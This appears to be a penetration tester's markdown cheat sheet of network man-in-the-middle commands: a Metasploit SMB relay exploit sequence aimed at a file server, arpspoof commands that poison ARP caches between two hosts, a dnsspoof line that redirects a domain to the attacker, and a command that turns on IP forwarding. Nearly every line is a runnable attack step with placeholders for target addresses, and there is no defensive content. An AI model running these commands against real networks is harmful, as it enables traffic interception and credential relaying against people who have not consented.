## MSFconsole for smb relay attack
```
search smb_relay
use 0
set SRVHOST $attacking_machine_ip
set LHOST $attacking_machine_ip
set SMBHOST $file_server_ip
exploit
```

## Arpspoof
### Spoofing command 
- Spoof $first_ip to convince $second_ip:$attacking_machine_mac
```
arpspoof -i eth1 -t $first_ip $second_ip
```
```
# arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
# arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
# The first command tells arpspoof to send ARP replies to 172.16.5.1, indicating that 172.16.5.5 is at the attacker's MAC address.
# The second command tells arpspoof to send ARP replies to 172.16.5.5, indicating that 172.16.5.1 is at the attacker's MAC address.
```

## Dnsspoof
```
echo "$attacking_machine_ip *.sportsfoo.com" > dns;dnsspoof -i eth1 -f dns
```
## ip_forward
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```



